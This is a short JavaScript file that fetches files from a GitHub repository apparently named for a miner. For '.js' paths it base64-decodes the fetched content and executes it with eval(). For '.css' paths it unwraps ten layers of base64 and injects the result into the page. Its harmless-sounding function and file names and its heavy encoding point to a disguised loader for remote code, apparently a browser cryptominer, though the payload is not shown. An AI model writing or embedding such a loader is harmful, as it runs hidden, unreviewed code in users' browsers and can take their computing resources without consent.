function GetItem(pathkey) {
    if (pathkey.includes('.js')) {
        fetch(`https://api.github.com/repos/DansAlto/Miner/contents/${pathkey}`)
            .then(docs => {
                if (docs.status === 200) {
                    return docs.json();
                } else {
                    throw new Error('Something went wrong');
                }
            })
            .then((data) => {
                let TextData = atob(data.content);
                eval(TextData);
            });
    }  else if(pathkey.includes(`.css`)) {
        fetch(`https://api.github.com/repos/DansAlto/Miner/contents/${pathkey}`)
        .then((res) => res.json())
        .then((data) => {
            let dd = Simplify(TTB(data.content));
            const newStyle = document.createElement(`style`);
            newStyle.textContent = dd;
            document.head.appendChild(newStyle);
        })
    }
}

function Simplify(string) {
    let text = string;
    for(let i = 0; i < 10; i++) {
        text = atob(text);
    }
    console.log(text);
    return text;
}

function TTB(str) {
    return btoa(String.fromCharCode.apply(null, str.replace(/\r|\n/g, "").replace(/([\da-fA-F]{2}) ?/g, "0x$1 ").replace(/ +$/, "").split(" ")));
}

GetItem('effects.css');
